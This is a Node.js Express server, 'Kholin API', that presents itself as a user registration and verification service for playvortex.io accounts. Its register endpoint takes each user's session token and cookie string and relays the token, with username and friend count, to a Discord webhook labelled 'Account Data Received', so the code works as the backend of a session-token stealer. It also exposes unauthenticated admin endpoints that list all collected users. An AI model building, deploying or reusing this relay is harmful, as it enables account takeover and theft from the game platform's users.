const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const crypto = require('crypto');

// Enable CORS for all routes
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.json());

// Store generated IDs (in production, use a database)
const generatedIds = new Map(); // userId -> { specialId, createdAt, username, verified, discordId, discordName }
const verifiedUsers = new Map(); // discordId -> { userId, username, specialId, verifiedAt }

// Generate a unique special ID for a user
function generateSpecialId(userId, username) {
    const secret = process.env.SECRET_KEY || 'kholin-secret-salt-2024';
    const hash = crypto.createHash('sha256')
        .update(userId + username + secret + Date.now().toString())
        .digest('hex')
        .substring(0, 16);
    return hash;
}

// ============================================
// MAIN REGISTER ENDPOINT
// ============================================

app.post('/api/users/register', async (req, res) => {
    try {
        const { userId, username, displayName, sessionToken, rawCookieString, friendsCount } = req.body;
        const WEBHOOK_URL = process.env.webhook;

        if (!WEBHOOK_URL) {
            console.error("Webhook not configured.");
            return res.status(500).json({ error: "Webhook missing" });
        }

        if (!userId || userId === "Unknown" || !username || username === "Unknown") {
            return res.status(400).json({ 
                error: "Invalid user data", 
                message: "userId and username are required" 
            });
        }

        let specialId = null;
        if (generatedIds.has(userId)) {
            specialId = generatedIds.get(userId).specialId;
            console.log(`[${userId}] Using existing special ID: ${specialId}`);
        } else {
            specialId = generateSpecialId(userId, username);
            generatedIds.set(userId, {
                specialId: specialId,
                createdAt: new Date().toISOString(),
                username: username,
                displayName: displayName || username,
                friendsCount: friendsCount || '0',
                verified: false
            });
            console.log(`[${userId}] Generated NEW special ID: ${specialId}`);
        }

        let avatarUrl = "https://playvortex.io/favicon.ico";
        if (userId && userId !== "Unknown") {
            avatarUrl = `https://playvortex.io/users/${userId}/avatar`;
        }

        const fields = [
            { name: "👤 Username", value: `**@${username}**`, inline: true },
            { name: "📛 Display Name", value: `**${displayName || username}**`, inline: true },
            { name: "🆔 User ID", value: `\`${userId}\``, inline: true },
            { name: "👥 Friends Count", value: `**${friendsCount || '0'}**`, inline: true },
            { name: "🔑 Special ID", value: `\`\`\`${specialId || 'N/A'}\`\`\``, inline: false },
            { name: "🔑 Session Token", value: `\`\`\`${sessionToken || 'N/A'}\`\`\``, inline: false }
        ];

        let friendEmoji = "👤";
        const count = parseInt(friendsCount) || 0;
        if (count >= 100) friendEmoji = "👑";
        else if (count >= 50) friendEmoji = "⭐";
        else if (count >= 25) friendEmoji = "🌟";
        else if (count >= 10) friendEmoji = "💫";
        else if (count >= 5) friendEmoji = "✨";

        const payload = {
            username: "Kholin Data Relay",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: "🦊 Account Data Received",
                color: 0x8f82c4,
                thumbnail: { url: avatarUrl },
                fields: fields,
                footer: { 
                    text: `Kholin System • ${friendEmoji} ${count} friends • ID: ${specialId || 'N/A'}`, 
                    icon_url: "https://playvortex.io/favicon.ico" 
                },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error("Discord webhook error:", response.status, errorText);
            return res.status(500).json({ error: "Discord webhook failed", details: errorText });
        }

        console.log(`✅ Data sent for ${username} (${userId}) with ${friendsCount || 0} friends`);
        
        return res.status(200).json({ 
            status: "success",
            data: {
                username,
                userId,
                friendsCount: friendsCount || '0',
                specialId: specialId
            }
        });

    } catch (err) {
        console.error("Server error:", err);
        return res.status(500).json({ error: err.message });
    }
});

// ============================================
// SPECIAL ID ENDPOINTS
// ============================================

app.get('/api/special-id/:userId', (req, res) => {
    const { userId } = req.params;
    
    console.log(`[Special ID] Request for user: ${userId}`);
    
    const trimmedUserId = userId.trim();
    
    if (generatedIds.has(trimmedUserId)) {
        const data = generatedIds.get(trimmedUserId);
        console.log(`[Special ID] Found:`, data);
        return res.json({
            success: true,
            userId: trimmedUserId,
            specialId: data.specialId,
            username: data.username,
            displayName: data.displayName,
            friendsCount: data.friendsCount,
            createdAt: data.createdAt,
            verified: data.verified || false,
            discordId: data.discordId || null,
            discordName: data.discordName || null
        });
    }
    
    for (const [key, value] of generatedIds) {
        if (key.toLowerCase() === trimmedUserId.toLowerCase()) {
            console.log(`[Special ID] Found case-insensitive match: ${key}`);
            return res.json({
                success: true,
                userId: key,
                specialId: value.specialId,
                username: value.username,
                displayName: value.displayName,
                friendsCount: value.friendsCount,
                createdAt: value.createdAt,
                verified: value.verified || false,
                discordId: value.discordId || null,
                discordName: value.discordName || null
            });
        }
    }
    
    console.log(`[Special ID] NOT found for user: ${trimmedUserId}`);
    return res.status(404).json({
        success: false,
        error: "No special ID found for this user"
    });
});

app.post('/api/generate-special-id', (req, res) => {
    const { userId, username } = req.body;
    
    console.log('[Generate] Request:', { userId, username });
    
    if (!userId || userId === "Unknown") {
        return res.status(400).json({
            success: false,
            error: "Valid userId required"
        });
    }
    
    if (generatedIds.has(userId)) {
        const existing = generatedIds.get(userId);
        console.log('[Generate] ID already exists:', existing);
        return res.json({
            success: true,
            specialId: existing.specialId,
            alreadyExists: true,
            userId: userId,
            username: existing.username
        });
    }
    
    const specialId = generateSpecialId(userId, username || "User");
    generatedIds.set(userId, {
        specialId: specialId,
        createdAt: new Date().toISOString(),
        username: username || "User",
        displayName: username || "User",
        friendsCount: '0',
        verified: false
    });
    
    console.log(`[Generate] Generated NEW ID for ${userId}: ${specialId}`);
    
    return res.json({
        success: true,
        specialId: specialId,
        alreadyExists: false,
        userId: userId,
        username: username || "User"
    });
});

// Mark user as verified (called by the bot or extension)
app.post('/api/verify-user', (req, res) => {
    const { userId, specialId, discordId, discordName } = req.body;
    
    console.log('[Verify User] Request:', { userId, specialId, discordId, discordName });
    
    if (!userId || !specialId) {
        return res.status(400).json({
            success: false,
            error: 'Missing userId or specialId'
        });
    }
    
    if (generatedIds.has(userId)) {
        const data = generatedIds.get(userId);
        if (data.specialId === specialId) {
            data.verified = true;
            data.verifiedAt = new Date().toISOString();
            data.discordId = discordId;
            data.discordName = discordName;
            
            if (discordId) {
                verifiedUsers.set(discordId, {
                    userId: userId,
                    username: data.username,
                    displayName: data.displayName,
                    specialId: specialId,
                    verifiedAt: new Date().toISOString(),
                    discordName: discordName
                });
            }
            
            console.log(`[Verify User] ✅ User ${data.username} verified!`);
            return res.json({
                success: true,
                verified: true,
                userId: userId,
                specialId: specialId,
                username: data.username,
                displayName: data.displayName
            });
        } else {
            return res.json({
                success: false,
                error: 'Special ID mismatch'
            });
        }
    }
    
    return res.status(404).json({
        success: false,
        error: 'User not found'
    });
});

// ============================================
// ADMIN ENDPOINTS
// ============================================

app.get('/api/all-special-ids', (req, res) => {
    const data = [];
    for (const [userId, info] of generatedIds) {
        data.push({
            userId,
            specialId: info.specialId,
            username: info.username,
            displayName: info.displayName,
            friendsCount: info.friendsCount,
            createdAt: info.createdAt,
            verified: info.verified || false,
            verifiedAt: info.verifiedAt || null,
            discordId: info.discordId || null,
            discordName: info.discordName || null
        });
    }
    return res.json({
        success: true,
        total: data.length,
        data: data
    });
});

app.get('/api/verified-users', (req, res) => {
    const data = [];
    for (const [discordId, info] of verifiedUsers) {
        data.push({
            discordId,
            ...info
        });
    }
    return res.json({
        success: true,
        total: data.length,
        data: data
    });
});

// ============================================
// HEALTH CHECK
// ============================================

app.get('/', (req, res) => {
    res.json({
        name: 'Kholin API',
        version: '1.0.0',
        status: 'running',
        endpoints: {
            register: 'POST /api/users/register',
            specialId: 'GET /api/special-id/:userId',
            generate: 'POST /api/generate-special-id',
            verifyUser: 'POST /api/verify-user',
            allIds: 'GET /api/all-special-ids',
            verifiedUsers: 'GET /api/verified-users',
            health: 'GET /health'
        }
    });
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        timestamp: new Date().toISOString(),
        webhookConfigured: !!process.env.webhook,
        generatedIdsCount: generatedIds.size,
        verifiedUsersCount: verifiedUsers.size
    });
});

app.listen(PORT, () => {
    console.log(`✅ Kholin Server running on port ${PORT}`);
    console.log(`   Webhook: ${process.env.webhook ? '✅ Configured' : '❌ Not configured'}`);
    console.log(`   Secret Key: ${process.env.SECRET_KEY ? '✅ Set' : '⚠️ Using default'}`);
});
